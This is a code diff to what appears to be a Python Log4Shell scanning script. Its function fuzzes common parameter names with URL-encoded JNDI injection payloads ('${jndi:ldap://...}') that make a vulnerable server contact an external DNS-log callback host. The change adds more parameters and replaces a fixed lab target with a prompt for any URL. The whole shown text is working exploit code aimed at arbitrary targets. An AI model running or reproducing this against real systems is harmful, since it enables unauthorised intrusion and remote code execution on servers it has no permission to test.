@@ -80,7 +80,7 @@ def log4j2_rce(url):
             payload = ''            # 如果没有获取到表单就fuzz一些参数
             p_list = [
                 'payload', 'id', 'key', 'action', 'm', 'page', 'a', 'page', 'search', 'username', 'password',
-                'name', 'uid', 'num', 'searchkey', 'url', 's', 'b', 'c', 'city', 'move'
+                'name', 'uid', 'num', 'searchkey', 'url', 's', 'b', 'c', 'city', 'move', 'step', 'method',
             ]
             for p in p_list:
                 payload += '{0}=%24%7bjndi%3aldap%3a%2f%2f{1}%2fping%7d'.format(p, target_dnslog_domain)
@@ -110,5 +110,5 @@ def log4j2_rce(url):
 
 
 if __name__ == '__main__':
-    print(log4j2_rce('http://vulfocus.fofa.so:26155/'))
-    # get_form_pararm('https://web.4399.com/')
+    url = input('url:')
+    print(log4j2_rce(url))
